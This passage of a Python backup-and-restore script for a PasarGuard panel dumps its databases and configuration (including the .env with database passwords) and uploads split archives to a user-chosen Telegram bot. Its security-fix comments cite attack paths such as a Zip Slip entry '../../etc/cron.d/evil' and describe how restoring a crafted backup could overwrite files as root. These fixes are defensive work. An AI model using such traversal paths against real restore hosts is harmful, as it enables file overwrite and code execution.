        print_success(f"Removed MySQL volume {source}.")
    else:
        print_warning(f"Unknown MySQL mount type {mtype!r}; skipping wipe.")
        return True

    return True

# ── Telegram ─────────────────────────────────────────────────
def send_telegram_file(token, chat_id, file_path, caption="", proxy=None):
    url      = f"https://api.telegram.org/bot{token}/sendDocument"
    boundary = f"----WKF{uuid.uuid4().hex}"
    if not os.path.exists(file_path):
        return False, "File not found"
    try:
        with open(file_path, "rb") as f:
            fc = f.read()
    except Exception as e:
        return False, str(e)
    fn    = os.path.basename(file_path)
    parts = []
    def field(n, v):
        parts.append(f"--{boundary}".encode())
        parts.append(f'Content-Disposition: form-data; name="{n}"'.encode())
        parts.append(b"")
        parts.append(v.encode() if isinstance(v, str) else v)
    field("chat_id", str(chat_id))
    if caption:
        field("caption", caption)
    parts.append(f"--{boundary}".encode())
    parts.append(f'Content-Disposition: form-data; name="document"; filename="{fn}"'.encode())
    parts.append(b"Content-Type: application/zip")
    parts.append(b"")
    parts.append(fc)
    parts.append(f"--{boundary}--".encode())
    parts.append(b"")
    body = b"\r\n".join(parts)
    req  = urllib.request.Request(url, data=body)
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("Content-Length", str(len(body)))

    opener, socks_ctx = None, None
    if proxy:
        scheme, host, port, user, pwd = _parse_proxy_url(proxy)
        if scheme in ("socks5", "socks5h", "socks4", "socks4a"):
            if _pysocks is None:
                return False, "PySocks is required for SOCKS proxies but could not be installed"
            proxy_type = _pysocks.SOCKS4 if scheme.startswith("socks4") else _pysocks.SOCKS5
            rdns = scheme in ("socks5h", "socks4a")
            socks_ctx = _SocksProxySocket(proxy_type, host, port, user, pwd, rdns=rdns)
        elif scheme in ("http", "https"):
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            return False, f"Unsupported proxy scheme: '{scheme}' (use http://, socks5:// or socks4://)"
    if opener is None:
        opener = urllib.request.build_opener()

    try:
        if socks_ctx:
            with socks_ctx:
                with opener.open(req, timeout=60) as r:
                    return True, r.read().decode()
        else:
            with opener.open(req, timeout=60) as r:
                return True, r.read().decode()
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}: {e.read().decode()}"
    except Exception as e:
        return False, str(e)

def _parse_proxy_url(proxy):
    from urllib.parse import urlparse
    p = urlparse(proxy)
    return p.scheme.lower(), p.hostname, p.port, p.username, p.password

class _SocksProxySocket:
    def __init__(self, proxy_type, host, port, username=None, password=None, rdns=True):
        self.proxy_type = proxy_type
        self.host, self.port = host, port
        self.username, self.password = username, password
        self.rdns = rdns
        self._orig_socket = None

    def __enter__(self):
        self._orig_socket = socket.socket
        _pysocks.set_default_proxy(self.proxy_type, self.host, self.port,
                                    rdns=self.rdns, username=self.username, password=self.password)
        socket.socket = _pysocks.socksocket
        return self

    def __exit__(self, *exc):
        socket.socket = self._orig_socket
        return False

def ask_telegram_proxy():
    ans = input(f" {C.R2}> Use a proxy for Telegram upload? (y/n): {C.RESET}").strip().lower()
    if ans != "y":
        return None
    proxy = input(
        f" {C.R2}> Proxy address (e.g. http://127.0.0.1:10809 or socks5h://127.0.0.1:1080): {C.RESET}"
    ).strip()
    return proxy or None

# ── Telegram file size handling ───────────────────────────────
TELEGRAM_BOT_MAX_FILE_SIZE = 50 * 1024 * 1024
TELEGRAM_SAFE_CHUNK_SIZE   = 49 * 1024 * 1024

def _split_file_into_chunks(file_path, chunk_size=TELEGRAM_SAFE_CHUNK_SIZE):
    file_size = os.path.getsize(file_path)
    if file_size <= chunk_size:
        return {"needs_split": False, "chunks": [file_path],
                "original": file_path, "total_size": file_size}

    base_dir  = os.path.dirname(file_path)
    base_name = os.path.basename(file_path)
    total     = (file_size + chunk_size - 1) // chunk_size

    parts = []
    with open(file_path, "rb") as src:
        for i in range(1, total + 1):
            chunk_path = os.path.join(base_dir, f"{base_name}.{i:03d}")
            with open(chunk_path, "wb") as dst:
                written = 0
                while written < chunk_size:
                    buf = src.read(min(chunk_size - written, 1024 * 1024))
                    if not buf:
                        break
                    dst.write(buf)
                    written += len(buf)
            parts.append(chunk_path)

    return {"needs_split": True, "chunks": parts,
            "original": file_path, "total_size": file_size}


def send_telegram_backup_archive(file_path, caption, token, chat_id, proxy=None):
    if not os.path.exists(file_path):
        return False, "File not found"

    info     = _split_file_into_chunks(file_path)
    chunks   = info["chunks"]
    original = info["original"]
    total    = len(chunks)

    if info["needs_split"]:
        size_mb = info["total_size"] / 1024 / 1024
        print_warning(
            f"Backup is {size_mb:.1f} MB — exceeds Telegram Bot API's "
            f"50 MB limit. Splitting into {total} parts…"
        )

    try:
        for idx, chunk_path in enumerate(chunks, 1):
            chunk_mb = os.path.getsize(chunk_path) / 1024 / 1024
            if info["needs_split"]:
                base_name = os.path.basename(original)
                cap = (
                    f"{caption}\n"
                    f"\n"
                    f"Part {idx}/{total}  ({chunk_mb:.1f} MB)\n"
                    f"\n"
                    f"To rejoin all parts on the server:\n"
                    f"  cat '{base_name}.*' > '{base_name}'\n"
                    f"Then unzip normally."
                )
            else:
                cap = caption
            label = f"part {idx}/{total} " if info["needs_split"] else ""
            print_info(f"Uploading {label}({chunk_mb:.1f} MB)…")
            ok, details = send_telegram_file(token, chat_id, chunk_path, cap, proxy)
            if not ok:
                print_error(f"Upload failed: {details}")
                return False, details
            if info["needs_split"]:
                print_success(f"Part {idx}/{total} sent.")
            else:
                print_success("Sent.")
    finally:
        if info["needs_split"]:
            for chunk_path in chunks:
                if chunk_path != original:
                    try:
                        os.remove(chunk_path)
                    except Exception:
                        pass

    return True, "OK"


def _join_chunks_if_needed(zip_name):
    """If chunks matching `zip_name` (e.g. `backup.zip.001`, `.002`, ...)
    exist in the same directory, automatically concatenate them into
    `base` and return the joined path. Otherwise return `zip_name`
    unchanged. Handles both the base name and the first-chunk name as
    input. Returns None if chunks are incomplete (gaps in numbering)."""
    import re, glob

    base = zip_name
    m = re.match(r"^(.*)\.(\d{3})$", zip_name)
    if m:
        base = m.group(1)

    candidates = sorted(glob.glob(base + ".*"))
    parts = [c for c in candidates if re.search(r"\.\d{3}$", c)]

    if len(parts) < 2:
        return base

    nums = sorted(int(re.search(r"\.(\d{3})$", p).group(1)) for p in parts)
    expected = list(range(1, len(parts) + 1))
    if nums != expected:
        missing = sorted(set(expected) - set(nums))
        print_error(f"Incomplete chunks: found {len(parts)}, missing {missing}")
        return None

    print_info(f"Detected {len(parts)} Telegram chunks. Joining into {C.BOLD}{base}{C.RESET}…")
    total_bytes = 0
    with open(base, "wb") as out:
        for p in parts:
            sz = os.path.getsize(p)
            print_info(f"  + {os.path.basename(p)} ({sz / 1024 / 1024:.1f} MB)")
            with open(p, "rb") as f:
                shutil.copyfileobj(f, out, length=1024 * 1024)
            total_bytes += sz

    print_success(f"Joined into {base} ({total_bytes / 1024 / 1024:.1f} MB total)")

    yn = input(
        f"  {C.R2}> Delete the {len(parts)} chunk files now that we have "
        f"the joined archive? (y/n): {C.RESET}"
    ).strip().lower()
    if yn == "y":
        for p in parts:
            try:
                os.remove(p)
            except Exception:
                pass
        print_success(f"Deleted {len(parts)} chunk files.")
    else:
        print_info("Chunks left on disk — delete them manually when no longer needed.")

    return base


# ── Backup scope selector ─────────────────────────────────────
def ask_backup_scope():
    print()
    print(f"  {C.R2}What do you want to back up?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard only{C.RESET}  "
          f"{C.R3}(/opt/pasarguard + DB + /var/lib/pasarguard){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard + PG-Node{C.RESET}  "
          f"{C.R3}(everything above + /opt/pg-node + /var/lib/pg-node){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1 or 2: {C.RESET}").strip()
        if choice in ("1", "2"):
            return choice == "2"
        print_error("Invalid choice. Enter 1 or 2.")

# ── Backup creation ───────────────────────────────────────────
def create_backup(include_node=True):
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Starting backup  scope: {C.BOLD}{scope_label}{C.RESET}")

    try:
        backend = _detect_backend_local()
    except Exception as e:
        print_warning(f"Backend auto-detection failed: {e} — assuming legacy postgres+pasarguard")
        backend = {
            "type": "postgresql", "host": "127.0.0.1", "port": 5432,
            "user": "pasarguard", "password": "", "dbname": "pasarguard",
            "container": None, "env": {}, "services": [], "sqlite_path": None,
        }
    print_info(
        f"Detected backend: {C.BOLD}{backend['type']}{C.RESET}  "
        f"db={backend['dbname']}  user={backend['user']}  "
        f"host={backend['host']}:{backend['port']}  "
        f"container={backend['container'] or '(none — sqlite)'}"
    )

    ts          = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    scope_tag   = "full" if include_node else "pg"
    backup_name = f"backup_{scope_tag}_{ts}"
    # v4.2.1 — was f"/tmp/{backup_name}" (world-readable 0755 while the
    # unencrypted dump + .env lived there). tempfile.mkdtemp gives us a
    # 0700 dir that only this process can read, and we always clean up
    # via shutil.rmtree(tmp_dir, ...) below.
    tmp_dir     = tempfile.mkdtemp(prefix=f"{backup_name}_")
    final_base  = os.path.join(os.getcwd(), backup_name)
    zip_path    = f"{final_base}.zip"

    db_dir        = os.path.join(tmp_dir, "db_dump")
    pg_data_dest  = os.path.join(tmp_dir, "pasarguard_data")
    node_opt_dest = os.path.join(tmp_dir, "pg_node_opt")
    node_data_dest= os.path.join(tmp_dir, "pg_node_data")

    try:
        os.makedirs(db_dir, exist_ok=True)

        print_info("Copying PasarGuard config files...")
        for fn in ("docker-compose.yml", ".env"):
            src = os.path.join(PASARGUARD_DIR, fn)
            if os.path.exists(src):
                shutil.copy(src, tmp_dir)

        if not _backup_database_local(backend, db_dir):
            print_error("Database backup failed. Aborting.")
            shutil.rmtree(tmp_dir, ignore_errors=True)
            return None

        if os.path.exists(PASARGUARD_DATA_DIR):
            print_info("Copying PasarGuard data directory...")
            shutil.copytree(PASARGUARD_DATA_DIR, pg_data_dest)
        else:
            print_warning(f"{PASARGUARD_DATA_DIR} not found — skipped")

        if include_node:
            if os.path.exists(PG_NODE_DIR):
                print_info("Copying PG-Node config (/opt/pg-node)...")
                shutil.copytree(PG_NODE_DIR, node_opt_dest)
            else:
                print_warning(f"{PG_NODE_DIR} not found — skipped")
            if os.path.exists(PG_NODE_DATA_DIR):
                print_info("Copying PG-Node data (/var/lib/pg-node)...")
                shutil.copytree(PG_NODE_DATA_DIR, node_data_dest)
            else:
                print_warning(f"{PG_NODE_DATA_DIR} not found — skipped")

        print_info("Compressing archive...")
        # v4.2.1 — set a 0700 umask BEFORE make_archive so the .zip is
        # created with owner-only perms atomically. The previous
        # make_archive-then-chmod flow had a TOCTOU window where any
        # local user could read the .env (with DB passwords) before
        # chmod 0600 ran.
        old_umask = os.umask(0o077)
        try:
            shutil.make_archive(final_base, "zip", tmp_dir)
        finally:
            os.umask(old_umask)
        shutil.rmtree(tmp_dir, ignore_errors=True)

        # Belt-and-braces — explicitly chmod in case umask was overridden
        # by something else in the script.
        try:
            os.chmod(zip_path, 0o600)
        except Exception:
            pass

        print_success(f"Archive: {zip_path}")
        return zip_path

    except Exception as e:
        print_error(f"Backup failed: {e}")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return None

# ── Per-backend local backup dispatchers ──────────────────────
def _backup_database_local(backend, db_dir):
    t = backend["type"]
    if t in ("postgresql", "timescaledb"):
        return _backup_postgres_local(backend, db_dir)
    if t in ("mysql", "mariadb"):
        return _backup_mysql_local(backend, db_dir)
    if t == "sqlite":
        return _backup_sqlite_local(backend, db_dir)
    print_error(f"Unsupported backend type: '{t}'")
    return False

def _backup_postgres_local(backend, db_dir):
    svc = backend.get("container") or "postgres"

    # v4.2.7 — resolve creds the same way _restore_postgres_local does
    # (via _resolve_pg_credentials: .env first, then `docker compose
    # config` fallback for creds hardcoded only in docker-compose.yml),
    # and forward the password as PGPASSWORD. Previously this function
    # only used backend["user"] (parsed from SQLALCHEMY_DATABASE_URL /
    # DB_USER) and never passed a password at all, unlike restore. On
    # any install where POSTGRES_USER/POSTGRES_PASSWORD live only in
    # docker-compose.yml's environment: block (very common on manual
    # installs), or where the Postgres/TimescaleDB service enforces
    # password auth, backup would silently fail or guess the wrong user
    # while restore of that very backup worked fine — the same class of
    # asymmetry that was previously fixed for MySQL/MariaDB.
    pg_user, pg_pwd = _resolve_pg_credentials(svc=svc)
    user = backend["user"] or pg_user or "pasarguard"
    pgflag = _pg_env_flag(pg_pwd)

    # v4.2.2 — run ALL dumps first and collect their results, then write
    # the manifest ONLY if every dump (including globals) succeeded.
    # The previous order opened manifest.tsv for writing before any
    # pg_dump ran, and the dump's return code was ignored — so a fully
    # failed backup would still leave a "complete" manifest on disk.
    # On restore the dispatcher would happily walk that manifest and try
    # to load the (empty) .sql files, producing the misleading
    # 'manifest.tsv not found or empty' error elsewhere because the
    # database restore itself silently produced nothing.
    print_info("Exporting PostgreSQL globals (pg_dumpall)...")
    globals_ok = run_command(
        f"docker compose exec -T {pgflag}{shlex.quote(svc)} pg_dumpall -U {shlex.quote(user)} --globals-only",
        output_file=os.path.join(db_dir, "globals.sql"),
        cwd=PASARGUARD_DIR,
    )

    databases = _list_databases_local(svc, user=user, pwd=pg_pwd)
    print_info(f"Found {len(databases)} Pasarguard database(s): {', '.join(databases)}")

    results = []  # list of (db, sql_file, has_ts, ts_ver, ok)
    for idx, db in enumerate(databases, 1):
        sql_file = f"db-{idx:03d}.sql"
        has_ts, ts_ver = _pg_db_timescale_info(svc, user, db, pwd=pg_pwd)
        print_info(f"Exporting database {C.BOLD}{db}{C.RESET} → {sql_file}  (may take a while)")
        ok = run_command(
            f"docker compose exec -T {pgflag}{shlex.quote(svc)} pg_dump -U {shlex.quote(user)} "
            f"--clean --if-exists -d {shlex.quote(db)}",
            output_file=os.path.join(db_dir, sql_file),
            cwd=PASARGUARD_DIR,
        )
        results.append((db, sql_file, has_ts, ts_ver, ok))

    all_ok = globals_ok and all(r[4] for r in results)
    if not all_ok:
        failed = [r[0] for r in results if not r[4]]
        print_error(
            f"One or more database dumps failed "
            f"({', '.join(failed) if failed else 'globals'}); NOT writing manifest."
        )
        print_error("Re-run the backup once the underlying pg_dump / connection issue is fixed.")
        # Clean up the partial .sql files so they don't get picked up as a
        # 'complete' backup on a future manual restore.
        for db, sql_file, _, _, ok in results:
            if not ok:
                try:
                    os.remove(os.path.join(db_dir, sql_file))
                except OSError:
                    pass
        if not globals_ok:
            try:
                os.remove(os.path.join(db_dir, "globals.sql"))
            except OSError:
                pass
        return False

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
        for db, sql_file, has_ts, ts_ver, _ in results:
            mf.write(f"{db}\t{user}\t{1 if has_ts else 0}\t{sql_file}\t{ts_ver}\n")

    print_success(f"Wrote manifest with {len(databases)} database entr{'y' if len(databases)==1 else 'ies'}.")
    return True

def _pg_db_timescale_info(svc, user, dbname, pwd=None):
    pgflag = _pg_env_flag(pwd)
    query = "SELECT extversion FROM pg_extension WHERE extname='timescaledb' LIMIT 1;"
    ok_v, out, _ = local_shell(
        f"docker compose exec -T {pgflag}{shlex.quote(svc)} psql -U {shlex.quote(user)} -d {shlex.quote(dbname)} "
        f"-tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v:
        return False, ""
    version = out.strip().splitlines()
    if version and version[0]:
        return True, version[0]
    return False, ""

def _backup_mysql_local(backend, db_dir):
    """Dump a single MySQL/MariaDB database (the official panel only uses
    one DB per install).

    v4.2 fix: MYSQL_PWD must be set *inside the container*, not on the host
    shell that runs `docker compose`. `docker compose exec` does not forward
    the host environment to the container unless told to with `-e`, so the
    previous `MYSQL_PWD=... docker compose exec ...` form silently had no
    effect and mysqldump would hang on / fail an interactive password
    prompt. Passing it via `exec -e` fixes that.

    v4.2.2 — try multiple credential candidates instead of one. Previously
    this function used only the user/password parsed out of
    SQLALCHEMY_DATABASE_URL (with a fallback to DB_USER/DB_PASSWORD in
    .env), and bailed on the first 1045 'Access denied'. That was
    asymmetric with _restore_mysql_local, which already iterates over
    (DB_USER,DB_PASSWORD) and (root,MYSQL_ROOT_PASSWORD). On installs
    where the panel's URL happens to carry one credential pair but the
    actual MySQL accepts a different one (very common — the panel
    normally uses `pasarguard/<DB_PASSWORD>` while root has
    `MYSQL_ROOT_PASSWORD`), the backup would fail and the user had no
    obvious fix short of editing the script. We now try all known pairs
    and stop at the first one that succeeds."""
    svc    = backend.get("container")
    dbname = backend["dbname"] or "pasarguard"

    if not svc:
        print_error("Could not identify the MySQL/MariaDB container — aborting.")
        return False

    # Build the candidate credential list. Order matters: prefer the creds
    # the panel itself uses (so the dump captures the same data the panel
    # sees), then fall back to whatever else is in .env.
    env      = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    url_user = backend["user"] or ""
    url_pwd  = backend["password"] or ""
    db_user  = env.get("DB_USER", "") or env.get("MYSQL_USER", "") or ""
    db_pwd   = env.get("DB_PASSWORD", "") or env.get("MYSQL_PASSWORD", "") or ""
    root_pwd = env.get("MYSQL_ROOT_PASSWORD", "") or ""

    candidates = []
    for cu, cp in ((url_user, url_pwd),
                   (db_user,  db_pwd),
                   ("root",   root_pwd)):
        if cu and cp and (cu, cp) not in candidates:
            candidates.append((cu, cp))

    # v4.2.6 — if .env has none of these credentials at all, they may be
    # hardcoded directly in docker-compose.yml instead (very common on
    # manual installs — MYSQL_USER/MYSQL_PASSWORD/MYSQL_ROOT_PASSWORD
    # under the mysql service's `environment:` block, with no .env
    # counterpart). Restore already falls back to `docker compose config`
    # in this case (_restore_mysql_local / _restore_mysql_remote); backup
    # didn't, so it silently failed on exactly the installs restore could
    # already handle. Mirror the same fallback here.
    if not candidates:
        try:
            cfg_out = subprocess.run(
                ["docker", "compose", "config"],
                cwd=PASARGUARD_DIR, check=True,
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            ).stdout.decode("utf-8", errors="replace")
            compose_env = _parse_compose_env_block(cfg_out, svc)
            candidates = _mysql_candidates_from_env_lines(compose_env)
            if candidates:
                print_info("Credentials not found in .env — using values from docker-compose.yml instead.")
        except (subprocess.CalledProcessError, OSError):
            pass

    if not candidates:
        # Last resort: try root with no password (some local dev setups).
        candidates.append(("root", ""))

    sql_file = "db-001.sql"
    out_path = os.path.join(db_dir, sql_file)

    last_err = ""
    for cred_user, cred_pwd in candidates:
        env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
        print_info(
            f"Exporting {backend['type']} database {C.BOLD}{dbname}{C.RESET} → {sql_file}  "
            f"(as user '{cred_user}')  (may take a while)"
        )
        # Run silently — we'll surface the LAST error only if every
        # candidate fails, so the user sees one clean diagnosis instead of
        # a wall of red.
        try:
            with open(out_path, "w") as _f:
                # v4.2.2 — added --databases (== -B). Without it mysqldump
                # writes only CREATE TABLE statements; on restore the
                # target database doesn't exist yet (fresh MySQL on a new
                # server) and every statement blows up with "No database
                # selected". --databases prepends CREATE DATABASE and USE,
                # so the dump is self-sufficient on restore.
                subprocess.run(
                    f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysqldump "
                    f"--databases --single-transaction --quick --triggers "
                    f"--events --routines --hex-blob --default-character-set=utf8mb4 "
                    f"{shlex.quote(dbname)}",
                    shell=True, check=True, stdout=_f,
                    stderr=subprocess.PIPE, cwd=PASARGUARD_DIR,
                )
            # Dump succeeded.
            manifest_path = os.path.join(db_dir, "manifest.tsv")
            with open(manifest_path, "w") as mf:
                mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
                mf.write(f"{dbname}\t{cred_user}\t0\t{sql_file}\t\n")
            print_success(
                f"Wrote manifest for {backend['type']} database '{dbname}' "
                f"(dump produced via user '{cred_user}')."
            )
            return True
        except subprocess.CalledProcessError as e:
            err = e.stderr.decode("utf-8", errors="replace").strip() if e.stderr else ""
            # Trim the noisy mysqldump banner to the first useful line.
            first_line = next((ln for ln in err.splitlines() if ln.strip()), err)
            print_warning(f"  mysqldump as '{cred_user}' failed: {first_line}")
            last_err = err

    print_error(
        f"All {len(candidates)} credential combination(s) failed for MySQL/MariaDB dump."
    )
    if last_err:
        print_error(f"Last mysqldump error:\n{last_err}")
    print_error(
        "Check DB_USER/DB_PASSWORD and MYSQL_ROOT_PASSWORD in /opt/pasarguard/.env,"
    )
    print_error(
        "and confirm one of those users can read the '{0}' database inside the '{svc}' container."
        .format(dbname, svc=svc)
    )
    return False

def _backup_sqlite_local(backend, db_dir):
    candidates = []
    if backend.get("sqlite_path"):
        candidates.append(backend["sqlite_path"])
    candidates += [
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite3"),
        os.path.join(PASARGUARD_DATA_DIR, "db.sqlite"),
    ]
    src = next((c for c in candidates if os.path.exists(c)), None)
    if not src:
        print_error(f"No SQLite database file found (tried: {', '.join(candidates)})")
        return False

    dst_name = os.path.basename(src)
    print_info(f"Copying SQLite database {src} → db_dump/{dst_name}")
    shutil.copy2(src, os.path.join(db_dir, dst_name))

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write("# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type=sqlite\n")
        mf.write(f"{os.path.splitext(dst_name)[0]}\tpasarguard\t0\t{dst_name}\t\n")
    print_success("Wrote manifest for SQLite database.")
    return True

# ── Workflow 1: Transfer to new server ───────────────────────
def _read_manifest(db_dir):
    manifest_path = os.path.join(db_dir, "manifest.tsv")
    if not os.path.exists(manifest_path):
        return None, []
    db_type = None
    entries = []
    with open(manifest_path) as f:
        for raw in f:
            line = raw.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                if "db_type=" in line:
                    for part in line.split():
                        if part.startswith("db_type="):
                            db_type = part.split("=", 1)[1]
                continue
            cols = line.split("\t")
            if len(cols) < 4:
                continue
            db       = cols[0]
            sql_file = cols[3]
            has_ts   = cols[2] == "1" if len(cols) > 2 else False
            ts_ver   = cols[4] if len(cols) > 4 else ""
            if db and sql_file:
                entries.append((db, sql_file, has_ts, ts_ver))
    if not db_type:
        if any(f.endswith(".sqlite3") or f.endswith(".sqlite") or f == "db_backup.sqlite" for _, f, _, _ in entries):
            db_type = "sqlite"
        elif os.path.exists(os.path.join(db_dir, "globals.sql")):
            db_type = "postgresql"
        elif any(f.endswith(".sql") for _, f, _, _ in entries):
            db_type = "mysql"
    return db_type, entries

def _read_manifest_remote(ssh, db_dir):
    """v4.2.2 — read manifest.tsv from the REMOTE host via SSH.

    The previous code path used the purely-local `_read_manifest()`
    inside `_restore_databases_remote`, so the transfer-to-new-server
    flow would always see an empty manifest — even when the file was
    sitting on the remote at /opt/pasarguard/db_dump/manifest.tsv.
    Symptom: 'manifest.tsv not found or empty — cannot restore
    databases' immediately after a successful `unzip` and a green
    Pasarguard DB startup, which (correctly) told the user nothing
    about why the restore was failing.

    We now `cat` the file over SSH and run it through the same parser
    logic. db_dir is the relative path on the remote (typically
    'db_dump') — joined onto PASARGUARD_DIR for the SSH commands.
    Returns (db_type, entries) just like _read_manifest, or (None, [])
    if the file doesn't exist or can't be read."""
    remote_manifest = f"{PASARGUARD_DIR}/{db_dir}/manifest.tsv"
    ec, _, _ = ssh_shell(ssh, f"test -f {shlex.quote(remote_manifest)}")
    if ec != 0:
        # v4.2.4 — one short retry before giving up. Harmless in the
        # normal case (extraction already finished synchronously via
        # execute_ssh_command's recv_exit_status), but cheap insurance
        # against any environment where the SFTP/SSH session sees a
        # stale directory listing for a moment after `unzip` returns.
        time.sleep(1.5)
        ec, _, _ = ssh_shell(ssh, f"test -f {shlex.quote(remote_manifest)}")
    if ec != 0:
        return None, []
    ec, text, _ = ssh_shell(ssh, f"cat {shlex.quote(remote_manifest)}")
    if ec != 0 or not text:
        return None, []

    db_type = None
    entries = []
    for raw in text.splitlines():
        line = raw.rstrip("\n")
        if not line.strip() or line.lstrip().startswith("#"):
            if "db_type=" in line:
                for part in line.split():
                    if part.startswith("db_type="):
                        db_type = part.split("=", 1)[1]
            continue
        cols = line.split("\t")
        if len(cols) < 4:
            continue
        db       = cols[0]
        sql_file = cols[3]
        has_ts   = cols[2] == "1" if len(cols) > 2 else False
        ts_ver   = cols[4] if len(cols) > 4 else ""
        if db and sql_file:
            entries.append((db, sql_file, has_ts, ts_ver))
    if not db_type:
        if any(f.endswith(".sqlite3") or f.endswith(".sqlite") or f == "db_backup.sqlite" for _, f, _, _ in entries):
            db_type = "sqlite"
        elif entries:
            db_type = "postgresql"
    return db_type, entries

def _verify_zip_has_manifest(zip_path):
    """v4.2.4 — sanity-check a freshly-created backup archive BEFORE it's
    uploaded anywhere. Opens the zip locally, looks for db_dump/manifest.tsv,
    and confirms it has at least one non-comment, non-empty data row.
    Returns True/False; prints its own error on failure so callers can just
    check the return value."""
    try:
        with zipfile.ZipFile(zip_path) as z:
            names = z.namelist()
            manifest_name = next(
                (n for n in names if n.replace("\\", "/").rstrip("/") == "db_dump/manifest.tsv"),
                None,
            )
            if not manifest_name:
                print_error("Archive sanity check: db_dump/manifest.tsv is missing from the zip.")
                print_error(f"  → Archive contains: {', '.join(sorted(names)) or '(empty)'}")
                return False
            raw = z.read(manifest_name).decode("utf-8", errors="replace")
            data_rows = [
                ln for ln in raw.splitlines()
                if ln.strip() and not ln.lstrip().startswith("#")
            ]
            if not data_rows:
                print_error("Archive sanity check: manifest.tsv has no database entries.")
                return False
            return True
    except (zipfile.BadZipFile, OSError) as e:
        print_error(f"Archive sanity check failed: could not open {zip_path}: {e}")
        return False

def _diagnose_missing_manifest(db_dir, *, ssh=None):
    """v4.2.2 — when _read_manifest finds nothing, print useful diagnostics
    instead of the bare 'manifest.tsv not found or empty'. Tells the user
    whether db_dir even exists, what files it contains (if any), and
    points at likely root causes (incomplete extraction, backup from an
    older script version, mid-backup dump failure, etc.)."""
    print_error("manifest.tsv not found or empty — cannot restore databases.")

    if ssh is not None:
        # v4.2.2 — db_dir is relative ("db_dump") and lives under
        # PASARGUARD_DIR on the remote. cd first so the relative path
        # resolves correctly; the previous bare `ls -la db_dump` would
        # look in the SSH session's home (~root) and always report
        # "does not exist" even when /opt/pasarguard/db_dump was fine.
        ec, out, _ = ssh_shell(ssh,
            f"cd {shlex.quote(PASARGUARD_DIR)} && ls -la {shlex.quote(db_dir)} 2>/dev/null")
        if ec != 0 or not out.strip():
            print_error(f"  → {PASARGUARD_DIR}/{db_dir} does not exist on the remote host.")
            print_error("     The backup archive probably didn't extract. Check free disk space,")
            print_error("     permissions on /opt/pasarguard/, and the 'Extracting files' log.")
            # v4.2.4 — show what actually IS in PASARGUARD_DIR, since
            # "the directory doesn't exist" alone doesn't tell you whether
            # the zip extracted somewhere else, extracted empty, or never
            # landed on disk at all.
            ec2, tree, _ = ssh_shell(ssh,
                f"find {shlex.quote(PASARGUARD_DIR)} -maxdepth 2 2>/dev/null")
            if ec2 == 0 and tree.strip():
                print_error(f"  → Actual contents of {PASARGUARD_DIR} (depth 2):")
                for line in tree.splitlines():
                    print_error(f"      {line}")
            return
        print_error(f"  → Remote {PASARGUARD_DIR}/{db_dir}/ contents:")
        for line in out.splitlines():
            print_error(f"      {line}")
        files = [ln.split()[-1] for ln in out.splitlines() if ln.startswith("-")]
    else:
        if not os.path.isdir(db_dir):
            print_error(f"  → {db_dir} does not exist locally.")
            print_error("     The backup archive probably didn't extract. Check the 'Extracting' log.")
            return
        try:
            files = sorted(os.listdir(db_dir))
        except OSError as e:
            print_error(f"  → Cannot list {db_dir}: {e}")
            return
        if not files:
            print_error(f"  → {db_dir} is empty (no files extracted).")
            return
        print_error(f"  → Local {db_dir}/ contents: {', '.join(files)}")

    has_sql    = any(f.endswith(".sql") for f in files)
    has_sqlite = any(f.endswith(".sqlite") or f.endswith(".sqlite3") for f in files)
    manifest_present = "manifest.tsv" in files

    if manifest_present:
        print_error("  → manifest.tsv exists but has no usable data rows.")
        print_error("     Check that the backup was created by a compatible version of this")
        print_error("     script (v4.0+ writes tab-separated rows; older versions used spaces).")
    elif has_sql:
        print_error("  → .sql files exist but manifest.tsv is missing.")
        print_error("     The backup may have been created with an older version of this script,")
        print_error("     OR pg_dump / mysqldump failed mid-run (in v4.2.2 the manifest is only")
        print_error("     written when ALL dumps succeed — run the backup again to recreate it).")
    elif has_sqlite:
        print_error("  → SQLite db file exists but manifest.tsv is missing.")
        print_error("     The backup may be from an older script version or be incomplete.")
    else:
        print_error("  → No SQL or SQLite files found. The backup appears incomplete.")
        print_error("     Re-download / re-upload the archive and try again.")

# ── Per-backend restore dispatchers ──────────────────────────
def _is_safe_restore_target(path, allowed_prefix):
    """Return True if `path` (after symlink resolution) is inside
    `allowed_prefix`. v4.2.1 — defends against a malicious backup whose
    .env sets SQLALCHEMY_DATABASE_URL to a path outside /var/lib/pasarguard/
    (e.g. /etc/cron.d/evil). Without this, restoring such a backup would
    silently overwrite an arbitrary file on disk."""
    try:
        real_prefix = os.path.realpath(allowed_prefix)
        real_path   = os.path.realpath(path)
        return (real_path.startswith(real_prefix.rstrip(os.sep) + os.sep)
                or real_path == real_prefix)
    except Exception:
        return False

def _safe_extract_zip(zip_path, dest):
    """Extract `zip_path` into `dest` using Python's zipfile module, after
    validating EVERY member refuses to escape `dest` via `..`, absolute
    paths, or symlinks. v4.2.1 — replaces `unzip -q -o` because that
    command happily extracts an entry like `../../etc/cron.d/evil` straight
    to that path on disk (Zip Slip). With the script running as root, this
    was a one-backup-away RCE on the restore host."""
    import zipfile as _zipfile
    dest_real = os.path.realpath(dest)
